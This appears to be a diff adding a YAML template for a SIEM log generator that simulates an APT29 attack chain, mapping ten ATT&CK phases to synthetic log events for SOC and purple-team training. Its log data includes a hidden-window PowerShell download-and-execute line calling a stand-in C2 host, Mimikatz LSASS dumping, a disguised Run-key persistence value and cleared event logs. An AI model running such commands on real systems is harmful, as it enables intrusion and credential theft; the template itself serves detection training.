@@ -1,0 +1,287 @@
+# APT29 (Cozy Bear) Attack Chain Template
+# Based on real-world TTPs observed from Russian APT group
+# Reference: MITRE ATT&CK Group G0016
+
+name: "APT29 Cozy Bear Campaign"
+description: "Simulates a sophisticated APT29 attack chain including initial access, persistence, credential access, and data exfiltration"
+category: "apt"
+difficulty: "advanced"
+use_cases:
+  - "Advanced Persistent Threat simulation"
+  - "SOC team training for nation-state attacks"
+  - "Testing detection capabilities against sophisticated threats"
+  - "Purple team exercises"
+
+chain:
+  name: "APT29 Cozy Bear Campaign"
+  description: "Multi-stage attack simulating APT29 tactics, techniques, and procedures"
+  category: "apt"
+  
+  metadata:
+    author: "SIEM Log Generator"
+    version: "1.0"
+    created: "2025-01-01"
+    tags: ["apt29", "cozy-bear", "nation-state", "advanced", "multi-stage"]
+    severity: "critical"
+    estimated_duration: 45 # minutes
+  
+  mitre_mapping:
+    tactics:
+      - "TA0001" # Initial Access
+      - "TA0002" # Execution
+      - "TA0003" # Persistence
+      - "TA0004" # Privilege Escalation
+      - "TA0005" # Defense Evasion
+      - "TA0006" # Credential Access
+      - "TA0007" # Discovery
+      - "TA0009" # Collection
+      - "TA0010" # Exfiltration
+      - "TA0011" # Command and Control
+    techniques:
+      - "T1566.001" # Spearphishing Attachment
+      - "T1059.001" # PowerShell
+      - "T1547.001" # Registry Run Keys
+      - "T1055" # Process Injection
+      - "T1070.004" # File Deletion
+      - "T1003.001" # LSASS Memory
+      - "T1082" # System Information Discovery
+      - "T1005" # Data from Local System
+      - "T1041" # Exfiltration Over C2 Channel
+      - "T1071.001" # Web Protocols
+    kill_chain_phases:
+      - "reconnaissance"
+      - "weaponization"
+      - "delivery"
+      - "exploitation"
+      - "installation"
+      - "command-and-control"
+      - "actions-on-objectives"
+  
+  steps:
+    # Phase 1: Initial Access
+    - id: "initial_access_spearphish"
+      name: "Spearphishing Email Delivery"
+      description: "APT29 sends targeted spearphishing emails with malicious attachments"
+      mitre:
+        technique: "T1566.001"
+        tactic: "TA0001"
+        subtechnique: "Spearphishing Attachment"
+        description: "Adversaries may send spearphishing emails with malicious attachments"
+      timing:
+        delayAfterPrevious: 0
+        duration: 120000 # 2 minutes
+        variance: 0.2
+      logGeneration:
+        templates: ["email_received", "attachment_detected", "suspicious_email"]
+        frequency: 8
+        sources: ["mail-server"]
+        customData:
+          sender: "partner@legitimate-domain.com"
+          attachment: "Q4_Financial_Report.pdf.exe"
+          subject: "Q4 Financial Results - Confidential"
+    
+    # Phase 2: Execution
+    - id: "powershell_execution"
+      name: "PowerShell Script Execution"
+      description: "Malicious attachment executes PowerShell script to download additional payloads"
+      mitre:
+        technique: "T1059.001"
+        tactic: "TA0002"
+        subtechnique: "PowerShell"
+        description: "Adversaries may abuse PowerShell commands and scripts"
+      timing:
+        delayAfterPrevious: 30000 # 30 seconds after email
+        duration: 180000 # 3 minutes
+        variance: 0.3
+      dependencies: ["initial_access_spearphish"]
+      logGeneration:
+        templates: ["powershell_execution", "script_execution", "process_creation"]
+        frequency: 12
+        sources: ["endpoint", "windows-server"]
+        customData:
+          command: "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden"
+          script_content: "IEX (New-Object Net.WebClient).DownloadString('http://malicious-c2.com/stage2.ps1')"
+    
+    # Phase 3: Persistence
+    - id: "registry_persistence"
+      name: "Registry Run Key Persistence"
+      description: "Establishes persistence through Windows Registry Run keys"
+      mitre:
+        technique: "T1547.001"
+        tactic: "TA0003"
+        subtechnique: "Registry Run Keys / Startup Folder"
+        description: "Adversaries may achieve persistence by adding programs to startup folders"
+      timing:
+        delayAfterPrevious: 60000 # 1 minute
+        duration: 90000 # 1.5 minutes
+        variance: 0.2
+      dependencies: ["powershell_execution"]
+      logGeneration:
+        templates: ["registry_modification", "persistence_established"]
+        frequency: 6
+        sources: ["endpoint", "windows-server"]
+        customData:
+          registry_key: "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+          value_name: "SecurityUpdate"
+          value_data: "C:\\Users\\Public\\svchost.exe"
+    
+    # Phase 4: Defense Evasion
+    - id: "process_injection"
+      name: "Process Injection for Evasion"
+      description: "Injects malicious code into legitimate processes to evade detection"
+      mitre:
+        technique: "T1055"
+        tactic: "TA0005"
+        subtechnique: "Process Injection"
+        description: "Adversaries may inject code into processes to evade process-based defenses"
+      timing:
+        delayAfterPrevious: 120000 # 2 minutes
+        duration: 150000 # 2.5 minutes
+        variance: 0.3
+      dependencies: ["registry_persistence"]
+      logGeneration:
+        templates: ["process_injection", "suspicious_process_activity"]
+        frequency: 10
+        sources: ["endpoint"]
+        customData:
+          target_process: "explorer.exe"
+          injection_technique: "DLL Injection"
+    
+    # Phase 5: Credential Access
+    - id: "lsass_dumping"
+      name: "LSASS Memory Dumping"
+      description: "Dumps LSASS memory to extract credentials"
+      mitre:
+        technique: "T1003.001"
+        tactic: "TA0006"
+        subtechnique: "LSASS Memory"
+        description: "Adversaries may attempt to access credential material stored in LSASS"
+      timing:
+        delayAfterPrevious: 300000 # 5 minutes
+        duration: 120000 # 2 minutes
+        variance: 0.2
+      dependencies: ["process_injection"]
+      logGeneration:
+        templates: ["lsass_access", "credential_dumping", "suspicious_memory_access"]
+        frequency: 15
+        sources: ["endpoint", "windows-server"]
+        customData:
+          tool: "Mimikatz"
+          target_process: "lsass.exe"
+    
+    # Phase 6: Discovery
+    - id: "system_discovery"
+      name: "System Information Discovery"
+      description: "Gathers system information for situational awareness"
+      mitre:
+        technique: "T1082"
+        tactic: "TA0007"
+        subtechnique: "System Information Discovery"
+        description: "Adversaries may attempt to get detailed information about the system"
+      timing:
+        delayAfterPrevious: 180000 # 3 minutes
+        duration: 240000 # 4 minutes
+        variance: 0.3
+      dependencies: ["lsass_dumping"]
+      logGeneration:
+        templates: ["system_enumeration", "discovery_commands"]
+        frequency: 8
+        sources: ["endpoint", "windows-server"]
+        customData:
+          commands: ["systeminfo", "net user", "net group", "whoami /priv"]
+    
+    # Phase 7: Collection
+    - id: "data_collection"
+      name: "Sensitive Data Collection"
+      description: "Searches for and collects sensitive files and documents"
+      mitre:
+        technique: "T1005"
+        tactic: "TA0009"
+        subtechnique: "Data from Local System"
+        description: "Adversaries may search local system sources to find files of interest"
+      timing:
+        delayAfterPrevious: 600000 # 10 minutes
+        duration: 480000 # 8 minutes
+        variance: 0.4
+      dependencies: ["system_discovery"]
+      logGeneration:
+        templates: ["file_access", "data_collection", "sensitive_file_access"]
+        frequency: 20
+        sources: ["endpoint", "windows-server"]
+        customData:
+          file_types: ["*.docx", "*.xlsx", "*.pdf", "*.txt"]
+          search_paths: ["C:\\Users", "C:\\Documents", "D:\\Shares"]
+    
+    # Phase 8: Command and Control
+    - id: "c2_communication"
+      name: "Command and Control Communication"
+      description: "Establishes persistent C2 communication channel"
+      mitre:
+        technique: "T1071.001"
+        tactic: "TA0011"
+        subtechnique: "Web Protocols"
+        description: "Adversaries may communicate using application layer protocols"
+      timing:
+        delayAfterPrevious: 60000 # 1 minute
+        duration: 600000 # 10 minutes (parallel with collection)
+        variance: 0.2
+      dependencies: ["system_discovery"]
+      logGeneration:
+        templates: ["c2_communication", "suspicious_network_activity", "http_beaconing"]
+        frequency: 25
+        sources: ["firewall", "proxy-server", "endpoint"]
+        customData:
+          c2_server: "legitimate-cdn.com"
+          beacon_interval: "300s"
+          user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    
+    # Phase 9: Exfiltration
+    - id: "data_exfiltration"
+      name: "Data Exfiltration Over C2"
+      description: "Exfiltrates collected sensitive data through established C2 channel"
+      mitre:
+        technique: "T1041"
+        tactic: "TA0010"
+        subtechnique: "Exfiltration Over C2 Channel"
+        description: "Adversaries may steal data by exfiltrating it over an existing C2 channel"
+      timing:
+        delayAfterPrevious: 120000 # 2 minutes after collection starts
+        duration: 360000 # 6 minutes
+        variance: 0.3
+      dependencies: ["data_collection", "c2_communication"]
+      logGeneration:
+        templates: ["data_exfiltration", "large_upload", "suspicious_outbound_traffic"]
+        frequency: 30
+        sources: ["firewall", "proxy-server", "endpoint"]
+        customData:
+          data_size: "2.3GB"
+          destination: "legitimate-cdn.com"
+          encryption: "AES-256"
+    
+    # Phase 10: Cleanup
+    - id: "evidence_cleanup"
+      name: "Evidence Cleanup and File Deletion"
+      description: "Removes traces of the attack to avoid detection"
+      mitre:
+        technique: "T1070.004"
+        tactic: "TA0005"
+        subtechnique: "File Deletion"
+        description: "Adversaries may delete files left behind by the actions of their intrusion"
+      timing:
+        delayAfterPrevious: 180000 # 3 minutes
+        duration: 120000 # 2 minutes
+        variance: 0.2
+      dependencies: ["data_exfiltration"]
+      logGeneration:
+        templates: ["file_deletion", "log_clearing", "cleanup_activity"]
+        frequency: 12
+        sources: ["endpoint", "windows-server"]
+        customData:
+          deleted_files: ["temp_payload.exe", "collected_data.zip", "credentials.txt"]
+          cleared_logs: ["Security", "System", "Application"]
+  
+  config:
+    max_duration: 3600000 # 1 hour maximum
+    abort_on_step_failure: false
+    log_chain_progress: true
+    cleanup_after_completion: true
